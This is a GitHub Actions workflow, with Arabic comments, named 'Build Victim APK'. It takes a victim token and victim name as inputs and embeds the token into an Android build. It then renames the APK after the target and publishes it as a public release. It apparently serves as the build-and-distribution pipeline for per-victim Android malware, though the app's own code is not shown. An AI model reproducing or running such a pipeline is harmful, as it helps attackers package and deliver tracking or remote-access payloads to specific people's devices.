name: Build Victim APK

on:
  push:
    branches: [main]
  workflow_dispatch:
    inputs:
      victim_token:
        description: 'Victim Token'
        required: true
        default: 'DEFAULT_TOKEN'
      victim_name:
        description: 'Victim Name'
        required: false
        default: 'Unknown'

permissions:
  contents: write

jobs:
  build:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Bump Version
        id: version
        run: |
          # اقرأ الـ version الحالي
          CURRENT=$(grep VERSION_CODE version.properties | cut -d= -f2)
          NEW=$((CURRENT + 1))
          
          # حدّث الملف
          echo "VERSION_CODE=$NEW" > version.properties
          echo "VERSION_NAME=1.0.$NEW" >> version.properties
          
          echo "new_code=$NEW" >> $GITHUB_OUTPUT
          echo "new_name=1.0.$NEW" >> $GITHUB_OUTPUT
          echo "== Bumped: $CURRENT → $NEW =="

      - name: Commit Version Bump
        run: |
          git config user.name "github-actions"
          git config user.email "actions@github.com"
          git add version.properties
          git commit -m "chore: bump version to ${{ steps.version.outputs.new_name }}" || true
          git push || true

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Android SDK
        run: |
          echo "ANDROID_HOME=$ANDROID_SDK_ROOT" >> $GITHUB_ENV
          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true

      - name: Cache Gradle
        uses: actions/cache@v3
        with:
          path: |
            ~/.gradle/caches
            ~/.gradle/wrapper
          key: ${{ runner.os }}-gradle-${{ hashFiles('**/*.gradle*', '**/gradle-wrapper.properties') }}

      - name: Set Victim Token
        id: preoutputs
        run: |
          TOKEN="${{ github.event.inputs.victim_token || 'DEFAULT_TOKEN' }}"
          NAME="${{ github.event.inputs.victim_name || 'Unknown' }}"
          SHORT="${TOKEN:0:12}"
          echo "token=$TOKEN" >> $GITHUB_OUTPUT
          echo "name=$NAME" >> $GITHUB_OUTPUT
          echo "short=$SHORT" >> $GITHUB_OUTPUT
          echo "== Token: $TOKEN =="

      - name: Grant Execute Permission
        run: chmod +x gradlew || true

      - name: Build APK
        env:
          VICTIM_TOKEN: ${{ steps.preoutputs.outputs.token }}
        run: |
          ./gradlew assembleDebug --no-daemon --stacktrace

      - name: List APK
        run: ls -la app/build/outputs/apk/debug/ || echo "No APK dir"

      - name: Rename APK
        run: |
          mkdir -p output
          SHORT="${{ steps.preoutputs.outputs.short }}"
          NAME="${{ steps.preoutputs.outputs.name }}"
          SAFE_NAME=$(echo "$NAME" | tr -cd '[:alnum:]_- ')
          if [ -z "$SAFE_NAME" ]; then SAFE_NAME="victim"; fi
          APK_NAME="Victim_${SAFE_NAME}_${SHORT}.apk"
          cp app/build/outputs/apk/debug/app-debug.apk "output/$APK_NAME"
          echo "== APK renamed to: $APK_NAME =="
          ls -la output/

      - name: Upload Artifact
        uses: actions/upload-artifact@v4
        with:
          name: Victim-${{ steps.preoutputs.outputs.short }}
          path: output/*.apk
          retention-days: 30

      - name: Create Release
        uses: softprops/action-gh-release@v1
        with:
          tag_name: victim-${{ github.run_number }}-${{ steps.preoutputs.outputs.short }}
          name: Victim-${{ steps.preoutputs.outputs.name }}-${{ steps.preoutputs.outputs.short }}
          body: |
            ## Victim APK
            - Victim: ${{ steps.preoutputs.outputs.name }} - ${{ steps.preoutputs.outputs.short }}...
            - Version: ${{ steps.version.outputs.new_name }}
            - Token: ${{ steps.preoutputs.outputs.short }}...
            - Build: ${{ github.run_number }}
          files: output/*.apk
          draft: false
          prerelease: false
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
